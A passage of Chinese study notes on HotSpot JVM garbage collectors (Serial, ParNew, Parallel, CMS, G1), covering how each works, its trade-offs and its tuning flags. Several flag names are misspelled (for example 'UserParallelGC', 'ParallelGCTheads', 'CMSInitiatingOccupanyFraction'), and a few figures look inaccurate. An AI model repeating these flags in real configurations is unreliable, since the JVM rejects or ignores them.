收集器的后备垃圾收集方案。\n\n这个收集器是一个单线程的收集器，但它的 ”单线程“ 的意义并不仅仅说明它**只会使用一个 CPU 或一条收集线程去完成垃圾收集工作**，更重要的是在它进行垃圾收集时，**必须暂停其他所有的工作线程**，直到它收集结束。\n\n优势：简单而高效（与其他收集器的单线程比），对于限定单个 CPU 的环境来说，Serial 收集器由于没有线程交互的开销，专心做垃圾收集自然可以获得最高的单线程收集效率。\n\n- 运行在 Client 模式下的虚拟机是个不错的选择。\n\n在用户的桌面应用场景中，可用内存一般不大（几十 MB 至一两百 MB），可以在较短时间内完成垃圾回收（几十 ms 至一百多 ms），只要不频繁发生，使用串行回收器是可以接受的。\n\n#### 参数配置\n\n在 HotSpot 虚拟机中，使用 `-XX:UseSerialGC` 参数可以指定年轻代和老年代都是用串行收集器。\n\n- 等价于新生代使用 Serial GC，且老年代使用 Serial Old GC。\n\n\n总结：这种垃圾收集器大家了解，现在已经不用串行的了。而且在限定单核 CPU 才可以用。现在都不是单核的了。\n\n对于交互较强的应用而言，这种垃圾收集器是不能接受的。一般在 Java Web 应用程序中是不会采用串行垃圾收集器的。\n\n\n\n### ParNew 回收器：并行回收\n\n如果说 Serial GC 是年轻代中的单线程垃圾收集器，那么 ParNew 收集器则是 Serial 收集器的多线程版本。\n\n- Par 是 Parallel 的缩写，New：只能处理的是新生代\n\nParNew 收集器除了采用**并行回收**的方式执行内存回收外，两款垃圾收集器之间几乎没有任何区别。ParNew 收集器在年轻代中同样也是**采用复制算法、STW 机制**。\n\nParNew 是很多 JVM 运行在 Server 模式下新生代的默认垃圾收集器。\n\n- 对于新生代，回收次数频繁，使用并行方式高效。\n- 对于老年代，回收次数少，使用串行方式节省资源。（CPU并行需要切换线程，串行可以省去切换线程的资源）\n\n由于 ParNew 收集器是基于并行回收，那么是否可以断定 ParNew 收集器的回收效率在任何场景下都会比 Serial 收集器更高效？\n\n- ParNew 收集器运行在多 CPU 环境下，由于可以充分利用多 CPU、多核心等物理硬件资源优势，可以更快速地完成垃圾收集，提升程序的吞吐量。\n- 但是在单个 CPU 的环境下，ParNew 收集器不比 Serial 收集器更高效。虽然 Serial 收集器是基于串行回收，但是由于 CPU 不需要频繁地做任务切换，因此可以有效避免多线程交互过程中产生的一些额外开销。\n\n除 Serial 外，目前只有 ParNew GC 能与 CMS 收集器配合工作。\n\n#### 参数配置\n\n在程序中，开发人员可以通过选项 `-XX:+UseParNewGC` 手动指定使用 ParNew 收集器执行内存回收任务。它表示年轻代使用并行收集器，不影响老年代。\n\n`-XX:ParallelGCThreads` 限制线程数量，默认开启和 CPU 数相同的线程数。\n\n\n\n### Parallel 回收器：吞吐量优先\n\nHotSpot 的年轻代中除了拥有 ParNew 收集器是基于并行回收以外，Parallel Scavenge 收集器同样也采用了复制算法、并行回收和 STW 机制。\n\n那么 Parallel 收集器的出现是否多此一举？\n\n- 和 ParNew 收集器不同，Parallel Scavenge 收集器的目标是达到一个**可控的吞吐量**（Throughput），它也被称为吞吐量优先的垃圾收集器。\n- 自适应调节策略也是 Parallel Scavenge 与 ParNew 的一个重要区别。\n\n高吞吐量则可以高效地利用 CPU 时间，尽快完成程序的运算任务，主要适合在后台运算而不需要太多交互的任务。因此，常见在服务器环境中使用。例如，那些执行批量处理、订单处理、工资支付、科学计算的应用程序。\n\nParallel 收集器在 JDK 1.6 时提供了用于执行老年代垃圾收集的 Parallel Old 收集器，用来代替老年代的 Serial Old 收集器。\n\nParallel Old 收集器采用了**标记-压缩算法**，但同样也是基于**并行回收**和 STW 机制。\n\n\n\n在吞吐量优先的应用场景中，Parallel 收集器和 Parallel Old 收集器的组合，在 Server 模式下的内存回收性能很不错。\n\n在 Java 8 中，默认也是此垃圾收集器。\n\n\n\n#### 参数配置\n\n- `-XX:+UserParallelGC` 手动指定年轻代使用 Parallel 并行收集器执行内存回收任务。\n- `-XX:+UseParallelOld` 手动指定老年代都是使用并行回收收集器。\n  - 上面两个参数，分别适用于新生代和老年代。默认 JDK 8 是开启的。\n  - 上面两个参数，默认开启一个，另一个也会被开启。（互相激活）\n- `-XX:ParallelGCTheads` 设置年轻代并行收集器的线程数。一般地，最好与 CPU 数量相等，以避免过多的线程数影响垃圾收集性能。\n  - 在默认情况下，当 CPU 数量小于 8 个，ParallelGCThreads 的值等于 CPU 数量。\n  - 当 CPU 数量大于 8 个，ParallelGCThreads 的值等于 `3 + ((5 * CPU_COUNT) / 8 )`。\n- `-XX:MaxGCPauseMillis` 设置垃圾收集器最大停顿时间（即 STW 的时间）。单位是毫秒。\n  - 为了尽可能地把停顿时间控制在 MaxGCPauseMillis 以内，收集器在工作时会调整 Java 堆大小或者其他一些参数。\n  - 对于用户来讲，停顿时间越短体验越好。但是在服务端，我们注重高并发，整体的吞吐量。所以服务器端适合 Parallel，进行控制\n  - **该参数使用需要谨慎。**\n- `-XX:GCTimeRatio` 垃圾收集时间占总时间的比例（= 1 / (N + 1)）。用于衡量吞吐量的大小。\n  - 取值范围（0, 100）。默认值 99，也就是垃圾回收时间不超过 1%。\n  - 与前一个 `-XX:MaxGCPauseMillis` 参数有一定的矛盾性。暂停时间越长，Radio 参数就容易超过设定的比例。\n- `-XX:+UseAdaptiveSizePolicy` 设置 Parallel Scavenge 收集器具有自适应调节策略。\n  - 在这种模式下，年轻代的大小，Eden 和 Survivor 的比例、晋升老年代的对象年龄等参数会被自动调整，以达到在堆大小、吞吐量和停顿时间之间的平衡点。\n  - 在手动调优比较困难的场合，可以直接使用这种自适应的方式，仅指定虚拟机的最大堆、目标的吞吐量（GCTimeRatio）和停顿时间（MaxGCPauseMillis），让虚拟机自己完成调度工作。\n\n\n\n### CMS  回收器：低延迟\n\n在 JDK 1.5 时期，HotSpot 推出了一款在强交互应用中几乎可认为有划时代意义的垃圾收集器：CMS（Concurrent-Mark-Sweep）收集器，这款收集器是 HotSpot 虚拟中第一款真正意义上的并发收集器，它第一次实现了让垃圾收集线程与用户线程同时工作。\n\nCMS 收集器的关注点是尽可能缩短垃圾收集时用户线程的停顿时间。停顿时间越短（低延迟）就越适合与用户交互的程序，良好的响应速度能提升用户体验。\n\n- 目前很大一部分的 Java 应用集中在互联网站或者 B/S 系统的服务端上，这类应用尤其重视服务的响应速度，希望系统停顿时间最短，以给用户带来较好的体验。CMS 收集器就非常符合这类应用的需求。\n\nCMS 的垃圾收集算法采用 标记-清除 算法，并且也会 STW。\n\n不幸的是，CMS 作为老年代的收集器，却无法与 JDK 1.4.0 中已经存在的新生代收集器 Parallel Scavenge 收集器配合工作，所以在 JDK 1.5 中使用 CMS 来收集老年代的时候，新生代只能选择 ParNew 或者 Serial 收集器中的一个。\n\n在 G1 出现之前，CMS 使用还是非常广泛的，一直到今天，任然有很多系统使用 CMS GC。\n\n#### CMS 工作原理\n\nCMS 整个过程比之前的收集器要复杂，整个过程分为 4 个主要阶段，即初始标记阶段、并发标记阶段、重新标记阶段、并发清除阶段。\n\n- 初始标记（Initial-Mark）阶段：在这个阶段中，程序用所有的工作线程都将会因为 STW 机制而出现短暂的暂停，这个阶段的主要任务**仅仅是标记出 GC Roots 能直接关联到的对象**。一旦标记完成之后就会恢复之前被暂停的所有应用线程。由于直接关联对象比较小，所以这里的**速度非常快**。\n- 并发标记（Concurrent-Mark）阶段：**从 GC Roots 的直接关联对象开始遍历整个对象图的过程**，这个过程**耗时较长**但是**不需要停顿用户线程**，可以与垃圾收集线程一起并发运行。\n- 重新标记（Remark）阶段：由于在并发标记阶段中，程序的工作线程会和垃圾收集线程同时运行或交叉运行，因此为了**修正并发标记期间，因用户程序继续运作而导致标记产生变动的那一部分对象的标记记录**，这个阶段的停顿时间通常会比初始标记阶段稍长一些，但也远比并发标记阶段的时间短。\n- 并发清除（Concurrent-Sweep）阶段：此阶段**清理删除掉标记阶段的已经死亡的对象，释放内存空间**。由于不需要移动存活对象，所以这个阶段也是可以与用户线程同时并发的。\n\n#### 分析\n\n尽管 CMS 收集器采用的是并发回收（非独占式），但是在其**初始化标记和再次标记这两个阶段中仍然需要执行 STW 机制暂停程序中的工作线程**，不过暂停时间并不会太长，因此可以说明目前所有的垃圾收集器都做不到完全不需要 STW，只是尽可能的缩短暂停时间。\n\n由于最耗费时间的并发标记与并发清除阶段都不需要暂停工作，所以整体的回收是低延迟的。\n\n另外，由于在垃圾收集阶段用户线程没有中断，所以在 CMS 回收过程中，还应该确保应用程序用户线程有足够的内存可用。因此，CMS 收集器不能像其他收集器那样等到老年代几乎完全被填满了在进行收集，而是当堆内存使用率达到某一阈值时，便开始进行回收，以确保应用程序在 CMS 工作过程中依然有足够的内存空间支持应用程序运行。要是 CMS 运行期间预留的内存无法满足程序需要，就会出现一次 ”Concurrent Mode Failure“ 失败，这时虚拟机将启动后备预案：临时启用 Serial Old 收集器来重新进行老年代的垃圾收集，这样停顿时间就很长了。\n\nCMS 收集器的垃圾收集算法采用的是 标记-清除 算法，这意味着每次执行完内存回收后，由于被执行内存回收的无用对象所占用的内存空间极有可能是不连续的一些内存块，不可避免地将会产生一些内存碎片。那么 CMS 在为新对象分配内存空间时，将无法使用指针碰撞（Bump the Pointer）技术，而只能选择空闲列表（Free List）执行内存分配。\n\n有人会觉得既然 Mark Sweep 会造成内存碎片，那么为什么不把算法换成 Mark Compact 呢？\n\n答案其实很简单，因为当并发清除的时候，用 Compact 整理内存的话，原来的用户线程使用的内存还怎么用？要保证用户线程能继续执行，前提得是它运行的资源不受影响。Mark Compact 更适合 STW 这种场景下使用。\n\n#### 优点\n\n- 并发收集\n- 低延迟\n\n#### 缺点\n\n- 会产生内存碎片，导致并发清除后，用户线程可用的空间不足。在无法分配大对象的情况下，不得不提前触发 Full GC。\n- 对 CPU 资源非常敏感，在并发阶段，它虽然不会导致用户停顿，但是会因为占用了一部分线程而导致应用程序变慢，总吞吐量会降低。\n- 无法处理浮动垃圾，可能会出现 ”Concurrent Mode Failure“ 失败而导致另一次 Full GC 的产生。在并发标记阶段由于程序的工作线程和垃圾收集线程是同时运行或者交叉运行的，那么在并发标记阶段如果产生新的垃圾对象，CMS 将无法对这些垃圾对象进行标记，最终会导致这些新产生的垃圾对象没有被及时回收，从而只能在下一次执行 GC 时释放这些之前未被回收的内存空间。\n\n#### 参数配置\n\n- `-XX:+UseConcMarkSweepGC` 手动指定使用 CMS 收集器执行内存回收任务。\n  - 开启该参数后会自动将 `-XX:+UseParNewGC` 打开。即：年轻代使用 ParNew 收集器 + 老年代使用 CMS 收集器 + 老年代的备用收集器 Serial Old 收集器\n- `-XX:CMSInitiatingOccupanyFraction` 设置堆内存使用率的阈值，一旦到达该阈值，便开始进行回收。\n  - JDK 5 及以前版本的默认值为 68，即当老年代的空间使用率达到 68% 时，会执行一次 CMS 回收。JDK 6 及以上的版本默认值为 92%。\n  - 如果内存增长缓慢，则可以设置一个稍大的值，大的阈值可以有效降低 CMS 的触发频率，减少老年代回收的次数可以较为明显地改善应用程序性能。反之，如果应用程序内存使用率增长很快，则应该降低这个阈值，以避免频繁触发老年代串行收集器。因此通过该选项便可以有效降低 Full GC 的执行次数。\n- `-XX:+UseCMSCompactAtFullCollection` 用于指定在执行完 Full GC 后对内存空间进行压缩整理，以此避免内存碎片的产生。不过由于内存压缩整理过程无法并发执行，所带来的问题就是停顿时间变得更长了。\n- `-XX:CMSFullGCsBeforeCompaction` 设置在执行多少次 Full GC 后对内存空间进行压缩整理。\n- `-XX:ParallelCMSThreads` 设置 CMS 的线程数量。\n  - CMS 默认启动的线程数是 （ParallelCMSThreads + 3） / 4\n  - ParallelCMSThreads 是年轻代并行收集器（ParNew）的线程数。当 CPU 资源比较紧张时，受到 CMS 收集器线程的影响，应用程序的性能在垃圾回收阶段可能会非常糟糕。\n\n#### 小结\n\nHotSpot 有这么多的垃圾回收器，那么如果有人问，Serial GC、Parallel GC、CMS GC 这三个 GC 有什么不同呢？\n\n- 如果你想要最小化地使用内存和并行开销，请选择 Serial GC\n- 如果你想要最大化应用程序的吞吐量，请选择 Parallel GC\n- 如果你想要最小化 GC 的中断或停顿时间，请选择 CMS GC\n\nJDK 9 新特性：CMS 被标记为 Deprecate 了（JEP291）\n\n- 如果对 JDK 9 及以上版本的 HotSpot 虚拟机使用参数 `-XX:+UseConcMarkSweepGC` 来开启 CMS 收集器的话，用户会收到一个警告信息，提示 CMS 为了将会被去除。\n\nJDK 14 新特性：去除 CMS 垃圾收集器（JEP363）\n\n- 移除了 CMS 垃圾收集器，如果在 JDK 14 中使用 `-XX:+UseConcMarkSweepGC` 的话，JVM 不会报错，只是给出警告，但是不会退出。JVM 会自动使用默认的 GC。\n\n\n### G1 回收器：区域化分代式\n\n**1.既然我们已经有了前面几个强大的 GC，为什么还要发布 Garbage First（G1）GC？**\n\n原因就在于对于应用程序所应用的**业务越来越庞大、复杂，用户越来越多**，没有 GC 就不能保证应用程序正常进行，而经常造成 STW 的 GC 又跟不上实际的需求，所以才会不断地尝试对 GC 进行优化。G1（Garbage First）垃圾回收器是在 Java 7 Update 4 之后引入的一个新的垃圾回收器，是当今收集器技术发展的最前沿成果之一。\n\n与此同时，为了适应现在**不断扩大的内存和不断增加的处理器数量**，进一步降低暂停时间（pause time），同时兼顾良好的吞吐量。\n\n**官方给 G1 设定的目标是在延迟可控的情况下获得尽可能高的吞吐量，所以才担当起”全功能收集器“的重任与期望。**\n\n**2.为什么名字叫做 Garbage First（G1）呢？**\n\n因为 G1 是一个并行回收器，它把堆内存分割成很多不相关的区域（Region）（物理上不连续的）。使用不同的 Region 来表示 Eden、Survivor0、Survivor1、老年代等。\n\nG1 GC 有计划地避免在整个 Java 堆中进行全区域的垃圾收集。G1 跟踪各个 Region 里面的垃圾堆积的价值大小（回收所获得的的空间大小以及回收所需时间的经验值），在后台维护一个优先列表，**每次根据允许的收集时间，优先回收价值最大的 Region**。\n\n由于这种方式的侧重点在于回收垃圾最大量的区间（Region），所以我们给 G1 一个名字：垃圾优先（Garbage First）。\n\n#### 概述\n\nG1（Garbage First）是一款面向服务端应用的垃圾收集器，主要针对配备多核 CPU 及大容量内存的机器，以极高概率满足 GC 停顿时间的同时，还兼具高吞吐量的性能特征。\n\n在 JDK 1.7 版本正式启用，移除了 Experimental 的标识，是 JDK 9 以后的默认垃圾回收器，取代了 CMS 回收器以及 Parallel + Parallel Old 组合。被 Oracle 官方称为 ”全功能的垃圾收集器“。\n\n与此同时，CMS 已经在 JDK 9 中被标记为废弃（Deprecated）。在  JDK 8 中还不是默认的垃圾回收器，需要使用 `-XX:+UseG1GC` 来使用。\n\n#### 优势\n\n与其他的 GC 收集相比，G1 使用了全新的**分区算法**，其特定如下所示：\n\n- **并行与并发**\n  - 并行性：G1 在回收期间，可以有多个 GC 线程同时工作，有效利用多核计算能力。此时用户线程 STW\n  - 并发性：G1 拥有与应用程序交替执行的能力，部分工作可以和应用程序同时执行，因此，一般来说，不会在整个回收阶段发生完全阻塞应用程序的情况。\n- **分代收集**\n  - 从分代上看，**G1 依然属于分代型垃圾回收器**，它会区分年轻代和老生代，年轻代依然有 Eden 区和 Survivor 区。但从堆的结构上看，它不要求整个 Eden 区、年轻代或者老年代都是连续的，也不再坚持固定大小和固定数量。\n  - 将**堆空间分为若干个区域（Region），这些区域中包含了逻辑上的年轻代和老年代**。\n  - 和之前的各类回收器不同，它同时**兼顾年轻代和老年代**。对比其他回收器，或者工作在年轻代，或者工作在老年代。\n- **空间整合**\n  - CMS：”标记-清除“ 算法、内存碎片、若干次 GC 后进行一次碎片整理\n  - G1 将内存划分成为一个个的 Region。内存的回收是以 Region 作为基本单位的。**Region 之间是复制算法**，但整体上实际可看做是**标记-压缩（Mark-Compact）算法**，两种算法都可以避免内存碎片。这种特性有利于程序长时间运行，分配大对象时不会因为无法找到连续内存空间而提前触发下一次 GC。尤其是当 Java 堆非常大的时候，G1 的优势更加明显。\n- **可预测的停顿时间模型**（即软实时 soft real-time）\n  - 这是 G1 相对于 CMS 的另一大优势，G1 除了追求低停顿外，还能建立可预测的停顿时间模型，能让使用者明确指定在一个长度为 M 毫秒的时间片段内，消耗在垃圾收集上的时间不得超过 N 毫秒。\n    - 由于分区的原因，G1 可以只选择部分区域进行内存回收，这样缩小了回收的范围，因此对于全局停顿情况的发生也能得到较好的控制。\n    - G1 跟踪各个 Region 里面的垃圾堆积的价值大小（回收所获得的空间大小以及回收所需时间的经验值），后台维护一个优先列表，**每次根据允许的收集时间，优先回收价值最大的 Region。**保证了 G1 收集器在有限的时间内可以**获取尽可能高的收集效率。**\n    - 相比于 CMS GC，G1 未必能做到 CMS 在最好情况下的延迟停顿，但是最差情况要好很多。\n\n#### 缺点\n\n相较于 CMS，G1 还不具备全方位、压倒性优势。比如在用户程序运行过程中，G1 无论是为了垃圾收集产生的内存占用（Footprint）还是程序运行时的额外执行负载（Overload）都要比 CMS 要高。\n\n从经验上说，在小内存应用上 CMS 的表现大概率会优于 G1，而  G1 在大内存应用上则发挥其优势。平衡点在 6-8 GB 之间。\n\n#### 参数配置\n\n- `-XX:+UseG1GC` 手动指定使用 G1 收集器执行内存回收任务。JDK 9 及以后默认开启。\n- `-XX:G1HeapRegionSize` 设置每个 Region 的大小。值是 2 的幂，范围是 1 MB 到 32 MB 之间，目标是根据最小的 Java 堆大小划分出约 2048 个区域。默认是堆内存的 1/2000。\n- `-XX:MaxGCPauseMillis` 设置期望达到的最大 GC 停顿时间指标（JJVM 会尽力实现，但不保证达到）。默认值是 200 ms。\n- `-XX:ParallelGCThread` 设置 STW 工作线程数的值。最多设置为 8。\n- `-XX:ConcGCThreads`设置并发标记的线程数。将 n 设置为并行垃圾回收线程数（ParallelGCThreads）的 1/4 左右。\n- `-XX:InitiatingHeapOccupanyPercent` 设置触发并发 GC 周期的 Java 堆占用率阈值。超过此值，就触发 GC。默认值是 45。\n\n#### 常见操作步骤\n\nG1 的设计原则就是简化 JVM 性能调优，开发人员只需要简单的三步即可完成调优：\n\n- 第一步，开启 G1 垃圾收集器\n- 第二步：设置堆的最大内存\n- 第三步：设置最大的停顿时间\n\nG1 中提供了三种垃圾回收模式：Young GC、Mixed GC 和 Full GC，在不同的条件下被触发。\n\n#### 适用场景\n\n- 面向服务端应用，针对具有大内存、多处理器的机器。（在普通大小的堆里表现并不惊喜）\n- 最主要的应用是需要低 GC 延迟，并具有大堆的应用程序提供解决方案\n- 如：在堆大小约 6GB 或更大时，可预测的暂停时间可以低于 0.5 秒；G1 通过每次只清理一部分而不是全部的 Region 的增量式清理来保证每次 GC 停顿时间不会太长。\n- 用来替换掉 CMS 收集器，在下面的情况时，使用 G1 可能比 CMS 好：\n  - 超过 50% 的 Java 堆被活动数据占用\n  - 对象分配频率或年代提升频率变化很大\n  - GC 停顿时间过长（长于 0.5 至 1 秒）\n- HotSpot 垃圾收集器里，除了 G1 以外，其他的垃圾收集器使用内置的 JVM 线程执行 GC 的多线程操作，而 G1 GC 可以采用应用线程承担后台运行的 GC 工作，即当 JVM 的 GC 线程处理速度慢时，系统会调用应用程序线程帮助加速垃圾回收过程。（啥意思？）\n\n#### 分区 Region：化整为零\n\n使用 G1 收集器时，它将整个 Java 堆划分成约 2048 个大小相同的独立 Region 块，每个 Region 块大小根据堆空间的实际大小而定，整体被控制在 1MB 到 32 MB 之间，且为 2 的 N 次幂，即 1 MB，2 MB，4 MB，8 MB，16 MB，32 MB。可以通过 `-XX:G1HeapRegionSize` 设定。所有的 Region 大小相同，且在 JVM 生命周期内不会被改变。\n\n虽然还保留有新生代和老年代的概念，但新生代和老年代不再是物理隔离的了，它们都是一部分 Region（不需要连续）的集合。通过 Region 的动态分配方式实现逻辑上的连续。\n\n一个 Region 有可能属于 Eden、Survivor 或者 Old/Tenured 内存区域。但是一个 Region 只可能属于一个角色。图中的 E 表示该 Region 属于 Eden 内存区域，S 表示属于 Survivor 内存区域，O 表示属于 Old 内存区域。图中空白的表示未使用的内存空间。\n\nG1 垃圾收集器还增加了一种新的内存区域，叫做 Humongous 内存区域，如图中的 H 块。主要用于存储大对象，如果超过一个 Region 的50%，就放到 H。（这里老师讲解有误，在《JVM G1源码分析和调优》书中写到：对于大对象分为两类，一类是大于HeapRegionSize的一半，但是小于HeapRegionSize，即一个完整的堆分区可以保存，则直接从空闲列表直接拿一个堆分区，或者分配一个新的堆分区。如果是连续对象，则需要多个堆分区，思路同上，但是处理的时候需要加锁。）\n\n设置 H 的原因：\n\n对于堆中的大对象，默认直接会分配到老年代，但是如果它是一个短期存在的大对象，就会对垃圾收集器造成负面影响。为了解决这个问题，G1 划分了一个 Humongous 区，它用来专门存放大对象。**如果一个 H 区装不下一个大对象，那么 G1 会寻找连续的 H 区来存储。**为了能找到连续的 H 区，有时候不得不启用 Full GC。G1 的大多数行为都把 H 区作为老年代的一部分来看待。\n\n\n#### 垃圾回收过程\n\nG1 GC 的垃圾回收过程主要包括如下三个环节：\n\n- 年轻代 GC（Young GC）\n- 老年代并发标记过程（Concurrent Marking）\n- 混合回收（Mixed GC）\n- （如果需要，单线程、独占式、高强度的 Full GC 还是继续存在的。它针对 GC 的评估失败提供了一种失败保护机制，即强力回收。）\n\nYoung GC → Young GC + Concurrent Marking → Mixed GC → Full GC\n\n应用程序分配内存，**当年轻代的 Eden 区用尽时开始年轻代回收过程**；G1 年轻代收集阶段是一个**并行**的**独占式**收集器。在年轻代回收期，G1 GC 暂停所有应用程序线程，启动所线程执行年轻代回收。然后**从年轻代区间移动存活对象到 Survivor 区间或者老年代区间，也有可能是两个区间都会涉及**。\n\n当堆内存使用达到一定值（默认 45%）时，开始老年代并发标记过程。\n\n标记完成马上开始混合回收过程。对于一个混合回收期，G1 GC 从老年区间移动存活对象到空闲区间，这些空闲区间也就成为了老年代的一部分。和年轻代不同，老年代的 G1 回收器和其他 GC 不同**，G1 的老年代回收器不需要整个老年代被回收，一次只需要扫描/回收一小部分老年代的 Region 就可以了**。同时，这个老年代 Region 是和年轻代一起被回收的。\n\n举个例子：一个 Web 服务器，Java 进程最大堆内存为 4 G，每分钟响应 1500 个请求，每 45 秒钟会新分配大约 2 G 内存。G1 会每 45 秒钟进行一次年轻代回收，每 31 个小时整个堆的使用率会达到 45 %，会开始老年代并发标记过程，标记完成后开始四到五次的混合回收。\n\n##### Remembered Set\n\n- 一个对象被不同区域引用的问题\n- 一个 Region 不可能是孤立的，一个 Region 中的对象可能被其他任意 Region 中的对象引用，判断对象存活时，是否需要扫描整个 Java 堆才能保证准确？\n- 在其他的分代收集器，也存在这样的问题（而 G1 更突出）\n- 回收新生代也不得不同时扫描老年代？\n- 这样的话会降低 Minor GC 的效率\n\n解决方法：\n\n- 无论 G1 还是其他分代收集器，JVM 都是使用 Remembered Set 来避免全局扫描；\n- 每个 Region 都有一个对应的 Remembered Set；\n- 每次 Reference 类型数据写操作时，都会产生一个写屏障（Write Barrier）暂时中断操作；\n- 然后检查将要写入的引用指向的对象是否和该 Reference 类型数据在不同的 Region（其他收集器：检查老年代对象是否引用了新生代对象）；\n- 如果不同，通过 CardTable（Remembered Set 的实现） 把相关引用信息记录到引用指向对象所在 Region 对应的 Remembered Set 中；\n- 当进行垃圾收集时，在 GC Roots 的枚举范围加入 Remembered Set，就可以保证不进行全局扫描，也不会有遗漏。\n\n#### 垃圾回收过程一：年轻代回收过程\n\nJVM 启动时，G1 先准备好 Eden 区，程序在运行过程中不断创建对象到 Eden 区，当 Eden 空间耗尽时，G1 会启动一次年轻代垃圾回收过程。\n\n年轻代垃圾回收只会收集 Eden 区和 Survivor 区。\n\nYGC 时，首先 G1 停止应用程序的执行（STW），G1 创建回收集（Collection Set），回收集是指需要被回收的内存分段的集合，年轻代回收过程的回收集包含年轻代 Eden 区和 Survivor 区所有的内存分段。\n\n然后开始如下回收过程：\n\n- **第一阶段，扫描根。**\n\n  根是指 static 变量指向的对象，正在执行的方法调用链上的局部变量等。根引用连同 RSet 记录的外部引用作为扫描存活对象的入口。\n\n- **第二阶段，更新 RSet。**\n\n  处理 Dirty Card Queue 中的 card，更新 RSet。此阶段完成后，**RSet 可以准确的反映老年代对所在的内存分段中对象的引用。**\n\n- **第三阶段：处理 RSet。**\n\n  识别被老年代对象所指向的 Eden 中的对象，这些被指向的 Eden 中的对象被认为是存活的对象。\n\n- **第四阶段：复制对象。**\n\n  此阶段，对象树被遍历，Eden 区内存段中存活的对象会被复制到 Survivor 区中空的内存分段，Survivor 区内存段中存活的对象如果年龄未达到阈值，年龄会加 1，达到阈值会被复制到 Old 区中的内存分段，如果 Survivor 空间不够，Eden 空间的部分数据会直接晋升到老年代空间。\n\n- **第五阶段：处理引用。**\n\n  处理 Soft、Weak、Phantom、Final、JNI Weak 等引用（这里可能描述不准确）。最终 Eden 空间的数据为空，GC 停止工作，而目标内存中的对象都是连续存储的，没有碎片，所以复制过程可以达到内存整理的效果，减少碎片。\n\n注：对于应用程序的引用赋值语句 object.fieled = object，JVM 会在之前和之后执行特殊的操作以在 Dirty Card Queue 中入队一个保存了对象引用信息的 card，在年轻代回收的时候，G1 会对 Dirty Card Queue 中所有的 card 进行处理，以更新 RSet，保证 RSet 实时准确的反映引用关系。\n\n那为什么不在引用赋值语句处直接更新 RSet 呢？这是为了性能的需要，RSet 的处理需要线程同步，开销会很大，使用队列性能会好很多。\n\n#### 垃圾回收过程二：老年代并发标记过程\n\n- **1.初始标记过程（STW）**：标记从根节点直接可达的对象。这个阶段是 STW 的，并且会触发一次年轻代 GC。\n- **2.根区域扫描（Root Region Scanning）**：G1 GC 扫描 Survivor 区直接可达的老年代区域对象，并标记被引用的对象。这一过程必须在 Young GC 之前完成。\n- **3.并发标记（Concurrent Marking）**：在整个堆中进行并发标记（和应用程序并发执行），此过程可能被 Young GC 中断。在并发标记阶段，若发现区域对象中所有的对象都是垃圾，那这个区域会被立即回收（实时回收）。同时，并发标记过程中，会计算每个区域的对象活性（区域中存活对象的比例）。\n- **4.再次标记（Remark,STW）**：由于应用程序持续进行，需要修正上一次的标记结果。是 STW 的。G1 中采用了比 CMS 更快的初始快照算法：snapshot-at-the-beginning（SATB）。\n- **5.独占清理（cleanup,STW）**:计算各个区域的存活对象和 GC 回收比例，并进行排序，识别可以混合回收的区域。为下阶段做铺垫。是 STW 的。\n- **6.并发清理阶段**：识别并清理完全空闲的区域\n\n#### 垃圾回收过程三：混合回收过程\n\n当越来越多的对象晋升到老年代 Old Region 时，为了避免堆内存被耗尽，虚拟机会触发一个混合的垃圾收集器，即 Mixed GC，该算法并不是一个 Old GC，除了回收整个 Young Region，还会回收一部分的 Old Region。这里需要注意：是一部分老年代，而不是全部老年代。可以选择哪些 Old Region 进行收集，从而可以对垃圾回收的耗时时间进行控制。也要注意的是 Mixed GC 并不是 Full GC。\n\n- 并发标记结束以后，老年代中百分百为垃圾的内存分段被回收了，部分为垃圾的内存分段被计算了出来。默认情况下，这些老年代的内存分段会分8次（可以通过 `-XX:G1MixedGCCountTarget` 设置）被回收。\n- 混合回收的回收集（Collection Set）包括八分之一的老年代内存分段，Eden 区内存分段，Survivor 区内存分段。混合回收的算法和年轻代回收的算法完全一样，只是回收集多了老年代的内存分段。具体过程请参考上面的年轻代回收过程。\n- 由于老年代中的内存分段默认分8次回收，G1 会优先回收垃圾多的内存分段。**垃圾占内存分段比例越高的，越会被先回收。**并且有一个阈值会决定内存分段是否被回收。`-XX:G1MixedGCLiveThresholdPercent` ，默认为 65%，意思是垃圾占内存分段比例要达到 65% 才会被回收。如果垃圾占比太低，意味着存活的对象占比高，在复制的时候会花费更多的时间。\n- 混合回收并不一定要进行 8 次。有一个阈值 `-XX:G1HeapWastePercent`，默认值为 10%，意思是允许整个堆内存中有 10% 的空间被浪费，意味着如果发现可以回收的垃圾占堆内存的比例低于 10%，则不再进行混合回收。因为 GC 会花费很多的时间但是回收到的内存却很少。\n\n#### 垃圾回收可选过程四：Full GC\n\nG1的初衷就是要避免 Full GC 的出现。但是如果上述方式不能正常工作，G1 会停止应用程序的执行（Stop-The-World），使用**单线程**的内存回收算法进行垃圾回收，性能会非常差，应用程序停顿时间会很长。\n\n要避免 Full GC 的发生，一旦发生 Full GC，需要对JVM参数进行调整。什么时候会发生 Full GC 呢？比如堆内存太小，当 G1 在复制存活对象的时候没有空的内存分段可用，则会回退到 Full GC，这种情况可以通过增大内存解决。\n\n导致 G1 Full GC 的原因可能有两个：\n\n- Evacuation 的时候没有足够的 To Space 来存放晋升的对象；\n- 并发处理过程完成之前空间耗尽。\n\n#### G1 补充\n\n从 Oracle 官方透露出来的信息可获知，回收阶段（Evacuation）其实本也有想过设计成与用户程序一起并发执行，但这件事情做起来比较复杂，考虑到 G1 只是回一部分 Region，停顿时间是用户可控制的，所以并不迫切去实现，**而选择把这个特性放到了 G1 之后出现的低延迟垃圾收集器（即 ZGC）中。**另外，还考虑到 G1 不是仅仅面向低延迟，停顿用户线程能够最大幅度提高垃圾收集效率，为了保证吞吐量所以才选择了完全暂停用户线程的实现方案。 \n\n#### G1 回收器的优化建议\n\n1. 年轻代大小\n   - 避免使用 -Xmn 或 -XX:NewRatio 等相关选项显式设置年轻代大小，因为固定年轻代的大小会覆盖可预测的暂停时间目标。我们让 G1 自己去调整\n2. 暂停时间目标不要太过严苛\n   - G1 GC 的吞吐量目标是 90% 的应用程序时间和 10% 的垃圾回收时间\n   - 评估 G1 GC 的吞吐量时，暂停时间目标不要太严苛。目标太过严苛表示你愿意承受更多的垃圾回收开销，而这些会直接影响到吞吐量。\n\n## 垃圾回收器总结\n\n截止 JDK 1.8，一共有 7 款不同的垃圾收集器。每一款的垃圾收集器都有不同的特点，在具体使用的时候，需要根据具体的情况选用不同的垃圾收集器。\n\n| 垃圾收集器   | 分类           | 作用位置       | 使用算法                | 特点         | 适用场景                                 |\n| ------------ | -------------- | -------------- | ----------------------- | ------------ | ---------------------------------------- |\n| 